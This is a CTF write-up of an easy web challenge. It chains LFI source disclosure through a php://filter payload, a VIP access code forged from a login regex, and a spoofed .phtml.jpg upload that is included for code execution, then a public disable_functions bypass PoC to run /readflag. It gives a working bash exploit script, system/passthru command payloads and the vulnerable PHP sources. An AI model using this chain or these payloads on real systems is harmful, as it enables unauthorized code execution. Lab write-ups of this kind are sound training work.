---
tags:
  - 🚩
up:
  - "[[02 - (incomplete) Data Exfiltration]]"
platform: HackTheBox
difficulty: Easy
creation_date: 2026-03-07
last_modified: 2026-03-07
---

# 🚩 [[BKSEC - ba-buoc-len-may-revenge]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - (incomplete) Data Exfiltration]]

**Related Techniques:** [[(incomplete) Local File Inclusion]], [[(incomplete) PHP disable_function bypass]]

**Related Tools:** 


## Executive Summary
* **URL:** `http://100.64.0.66:36363`
* **OS:** Linux
* **Key Technique:** **LFI** into revealing the source code of the web PHP files, this revealed a  file upload vulnerability that allow attacker to upload `.phtml.jgp` file to the server and execute them. Flag achieved by exploiting a **disable_functions bypass** using `concat_function` with a PoC on github.
* **Status:** `Completed`

---

## Reconnaissance
### Gobuster Scan
```bash
gobuster dir --url http://100.64.0.66:36363/ --wordlist ~/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x php,html,txt,bak
````

![[Pasted image 20260307223859.png]]

`Gobuster` scan revealed some interesting endpoints that is `login` and `upload`, however to get there we must login first.

### Arjun Scan

```bash
arjun -u http://100.64.0.66:36363/
```

![[Pasted image 20260307224058.png]]

No parameters was found.

### Web Enumeration

All roads leads to `login.php` so I go there first.

![[Pasted image 20260307224224.png]]

The URL is intriguing with parameter `?page=login.php` instead of just `/login.php` like normal, this can be a Local File Inclusion vulnerabilty so I decide to take a look into it and change the name to `../../../../etc/passwd` to see if I can do path traversal but I cannot as the page reset to the home page.

![[Pasted image 20260307224508.png]]

Changing the parameter to the `index.php` give me a blank page, `apply.php` and `upload.php` redirect me back to the login page.

I tried the final payload that is:
```
http://100.64.0.66:36363/index.php?page=php://filter/convert.base64-encode/resource=upload.php
```

and the page return me this:

![[Pasted image 20260307224758.png]]

The long string is the **base64** encoding of the code, so I copy it and decode them on my machine, to get the code of all of the php files.

**Login.php**:

```php
<?php
// redirect on direct access
if (__FILE__ === realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('Location: index.php?page=login.php');
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if (strpos($username, "'") !== false || strpos($username, '"') !== false ||
        strpos($password, "'") !== false || strpos($password, '"') !== false) {
        http_response_code(500);
        die("Database Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" . htmlspecialchars($username) . "' at line 1");
    }
    $error = "Invalid credentials";
}

if (isset($_POST['vip_code']) && !empty($_POST['vip_code'])) {
    $code = $_POST['vip_code'];

    if (strpos($code, "'") !== false || strpos($code, '"') !== false) {
        http_response_code(500);
        die("Database Error: You have an error in your SQL syntax near '" . htmlspecialchars($code) . "'");
    }

    // require_once('apply.php');

    function validate_vip_code($code) {
        $pattern = '/^CYBER2026-[A-Z]{3}[0-9]{4}[!@#$%][A-Z]{2}_[0-9]{6}$/';
        return preg_match($pattern, $code) === 1;
    }

    if (validate_vip_code($code)) {
        $_SESSION["logged"] = true;
        echo '<script>window.location.href = "index.php?page=apply.php";</script>';
        exit();
    } else {
        $error = "Invalid VIP access code format";
    }
}
?>

<div class="grid product">
    <div class="column-xs-12 column-md-6" style="margin: 0 auto; float: none;">
        <h1>Member Login</h1>
        <div class="description">
            <p>Existing members can login to access the application portal.</p>
        </div>

        <?php if (isset($error)): ?>
            <div style="color: #ef4444; padding: 1rem; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 0.25rem; margin-bottom: 1rem;">
                <?php echo $error; ?>
            </div>
        <?php endif; ?>

        <form method="POST" action="/index.php?page=login.php">
            <input type="text" class="form-control" name="username" placeholder="Username">
            <input type="password" class="form-control" name="password" placeholder="Password">
            <button type="submit" class="add-to-cart">Login</button>
        </form>

        <div style="margin: 1.5rem 0; text-align: center; color: #64748b;">
            <small>- OR -</small>
        </div>

        <form method="POST" action="/index.php?page=login.php">
            <input type="text" class="form-control" name="vip_code" placeholder="VIP Access Code">
            <button type="submit" class="add-to-cart">Login</button>
        </form>

        <p style="margin-top: 2rem; color: #64748b;">
            <small>Members can login with credentials or VIP access code.</small>
        </p>
    </div>
</div>
```

**upload.php:**

```php
<?php
session_start();

if (isset($_SESSION["logged"])) {
    $target_dir = "./user_submissions/";
    $fileName = basename($_FILES["uploadFile"]["name"]);
    $target_file = $target_dir . $fileName;

    if (strpos($fileName, '.php') !== false) {
        echo "Extension not allowed";
        die();
    }

    if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
        echo "Only images are allowed";
        die();
    }

    if ($_FILES["uploadFile"]["size"] > 500000) {
        echo "File too large";
        die();
    }

    if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
        echo "File successfully uploaded";
    } else {
        echo "File failed to upload";
    }
} else {
    echo "Only logged in users can upload files";
}
```

**index.php:**
```php
<?php
ob_start();
session_start(); // Start session before any HTML output

// only allow php files to be included
if (isset($_GET['page']) && strlen($_GET['page']) < 1000 && preg_match('/^.*\.ph(p|ps|tml)/', $_GET['page'])) {
    // prevent directory traversal
    $page = $_GET['page'];
    while (substr_count(urldecode($page), '../', 0)) {
        $page = str_replace('../', '', urldecode($page));
    };
} else {
    // default to home page
    $page = "home.php";
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>CyberElite Security Club - Membership Application</title>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <link rel='stylesheet' href='https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css'>
    <link rel="stylesheet" href="./style.css">

</head>

<body>
    <nav class="flex-nav">
        <div class="container">
            <div class="grid menu">
                <div class="column-xs-8 column-md-6">
                    <p id="highlight">CyberElite Security Club</p>
                </div>
                <div class="column-xs-4 column-md-6">
                    <a href="#" class="toggle-nav">Menu <i class="ion-navicon-round"></i></a>
                    <ul>
                        <li class="nav-item"><a href="/">Home</a></li>
                        <li class="nav-item"><a href="/index.php?page=apply.php">Join Us</a></li>
                        <li class="nav-item"><a href="/index.php?page=login.php">Login</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </nav>
    <main>
        <div class="container">
            <div class="grid second-nav">
                <div class="column-xs-12">
                </div>
            </div>
            <?php ((include $page) == TRUE) || include('home.php'); ?>
        </div>
    </main>
    <footer>
        <div class="grid">
            <div class="column-xs-12">
                <p class="copyright">&copy; 2026 CyberElite Security Club. All Rights Reserved.</p>
            </div>
        </div>
    </footer>
    <script src="./script.js"></script>

</body>

</html>
```

**apply.php:**

```php
<?php
if (__FILE__ === realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('Location: index.php?page=apply.php');
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
if (!isset($_SESSION["logged"])) {
    header('Location: index.php?page=login.php');
    exit();
}
?>

<div class="grid product">
    <div class="column-xs-12 column-md-12">
        <h1>Membership Application</h1>
        <div class="description">
            <p>Join CyberElite Security Club and become part of an exclusive network of cybersecurity professionals.</p>
        </div>
    </div>
</div>

<div class="grid">
    <div class="column-xs-12 column-md-6">
        <h2>Application Requirements</h2>
        <p>To apply for membership, please provide the following information:</p>
        <ul style="list-style: disc; padding-left: 20px; margin-top: 20px;">
            <li style="margin-bottom: 10px;">Full Name and Professional Title</li>
            <li style="margin-bottom: 10px;">Professional Email Address</li>
            <li style="margin-bottom: 10px;">LinkedIn Profile or Professional Portfolio</li>
            <li style="margin-bottom: 10px;">Areas of Expertise and Interest</li>
            <li style="margin-bottom: 10px;">Professional Headshot (JPG, PNG, or GIF format)</li>
        </ul>
        <p style="margin-top: 20px;">All applications are reviewed by our membership committee. You will receive a response within 5-7 business days.</p>
    </div>
    <div class="column-xs-12 column-md-6">
        <h2>Submit Your Application</h2>
        <form id="applicationForm" method="post">
            <input type="text" class="form-control" name="fullname" placeholder="Full Name" required>
            <input type="text" class="form-control" name="title" placeholder="Professional Title" required>
            <input type="email" class="form-control" name="email" placeholder="Email Address" required>
            <input type="url" class="form-control" name="linkedin" placeholder="LinkedIn Profile URL" required>
            <textarea class="form-control" name="expertise" placeholder="Tell us about your cybersecurity expertise and interests..." rows="4" required></textarea>

            <div style="margin-top: 20px; margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 10px; color: #333; font-weight: bold;">Professional Headshot</label>
                <label for="uploadFile" style="cursor: pointer;">
                    <img src="https://via.placeholder.com/150/2c3e50/ffffff?text=Upload+Photo" id="upload-image" class="upload-image" alt="Upload">
                </label>
                <input type="file" id="uploadFile" name="uploadFile" onchange="checkFile(this)" accept="image/*" required>
            </div>

            <div id="error_message" style="color: #d9534f; margin-bottom: 10px;"></div>

            <button type="button" id="submit-upload" class="btn btn-primary" style="margin-right: 10px;">Upload Photo</button>
            <button type="submit" id="submit-form" class="add-to-cart" disabled>Submit Application</button>
        </form>
    </div>
</div>
```


## Upload file vulnerability with LFI

Looking at the `upload.php` file I know I can spoof the file extension and include it to execute the file with `index.php?page=`. the uploaded file will then be stored inside 
`./user_submissions/`.

Based on the **index.php** file I know that I can include the file and execute them as PHP based on the its regex filter:

```php
<?php

ob_start();

session_start(); // Start session before any HTML output

// only allow php files to be included

if (isset($_GET['page']) && strlen($_GET['page']) < 1000 && preg_match('/^.*\.ph(p|ps|tml)/', $_GET['page'])) {

// prevent directory traversal

$page = $_GET['page'];

while (substr_count(urldecode($page), '../', 0)) {

$page = str_replace('../', '', urldecode($page));

};

} else {

// default to home page

$page = "home.php";

}

?>
```

The code also use `str_replace()` to attempt to prevent path traversal but the code is not recursive so basically I can include file anywhere I can write to.

I ask Gemini for the regex meaning and it gives me this:

![[Pasted image 20260307230113.png]]

Meaning as long as the file has a `php` or `phps` or `phtml` anywhere inside the name I can include it. It will come in handy when I spoof the file extension with `.jpg` or anything.

Looking at the `login.php` I can see the regex of the VIP pass and forge one myself to infiltrate the system.

```php
function validate_vip_code($code) {
    $pattern = '/^CYBER2026-[A-Z]{3}[0-9]{4}[!@#$%][A-Z]{2}_[0-9]{6}$/';
        return preg_match($pattern, $code) === 1;
    }

    if (validate_vip_code($code)) {
        $_SESSION["logged"] = true;
        echo '<script>window.location.href = "index.php?page=apply.php";</script>';
        exit();
    } else {
        $error = "Invalid VIP access code format";
}
```

Asking Gemini to forge me a valid code:

![[Pasted image 20260307231647.png]]

The code is: `CYBER2026-AAA1111!AA_111111`

The `login.php` file also has a part where it fake an SQL error to trick attack into performing SQLi. I also tried `SQLmap` on the page just for sure:

```bash
sqlmap -r request.txt --dbs --batch
```



And nothing seems to be injectable.

Move on to the upload, now that I have the source code of all of the pages, I can craft a bash file to automate the exploit. I ask Gemini for a bash script:

![[Pasted image 20260307232554.png]]

I change it a bit so that it worked a little better.

```bash
#!/bin/bash

TARGET_URL="http://100.64.0.66:36363"
VIP_CODE="CYBER2026-AAA1111!AA_111111"
COOKIE_FILE="cookies.txt"

echo "[*] Step 1: Logging in..."
curl -s -c $COOKIE_FILE -X POST "$TARGET_URL/index.php?page=login.php" -d "vip_code=$VIP_CODE" > /dev/null

echo "[*] Step 2: Creating and Uploading Payload..."
# Using cat << 'EOF' prevents Bash from trying to parse the PHP
cat << 'EOF' > payload.phtml.jpg
<?php

?>
EOF

curl -s -b $COOKIE_FILE -F "uploadFile=@payload.phtml.jpg" "$TARGET_URL/index.php?page=upload.php" | grep -o "File successfully uploaded"

echo "[*] Step 3: Executing LFI..."
# We use sed to extract only the text between our markers
curl -s -b $COOKIE_FILE "$TARGET_URL/index.php?page=user_submissions/payload.phtml.jpg" 

rm payload.phtml.jpg
```


###  Enumerate the system

I first start enumerating with some payload, the first thing I know is that things like 
`<?php passthru($_GET['cmd']); ?>` and `<?php system($_GET['cmd']); ?>` to see if I can RCE, but it seems like these are blocked by the system.

![[Pasted image 20260307233102.png]]

I decide to check if what more I was blocked from using:

```php
<?php
  echo "DISABLED: " . ini_get('disable_functions') . "\n";
?>
```

![[Pasted image 20260307233327.png]]

Since most of usual tools for RCE are blocked, I decide to go look around more 

```php
<?php
	echo getcwd() . "\n\n";
	
	$root_files = scandir('/');
	print_r($root_files);
	
	$home_files = @scandir('/home'); 
	print_r($home_files);
?>
```

![[Pasted image 20260307233537.png]]

Inside the root directory there is a `/readflag` file, this is very likely a executable, but to run it I need to have RCE, and I need to know if I have enough permission.

```php
<?php
    echo "Permissions: " . sprintf('%o', fileperms('/readflag')) . "\n";
?>
```

![[Pasted image 20260307233938.png]]

The file is an SUID meaning I can execute it as a low-privilege user.

```php
<?php
	echo "=== System Info ===\n";
	echo "PHP Version: " . phpversion() . "\n";
	echo "System: " . php_uname() . "\n";
	echo "Architecture: " . (PHP_INT_SIZE * 8) . "-bit\n";
?>
```

![[Pasted image 20260307234244.png]]

The is using PHP 8.0.12. I ask Gemini for vulnerabilities and based on the found information and it suggest me a PoC [here](https://github.com/mm0r1/exploits/blob/master/php-concat-bypass/exploit.php) that can bypass `disabled_functions()`

![[Pasted image 20260307235020.png]]

Pasting the PHP code directly into the placeholder I managed to achieve RCE and get the flag.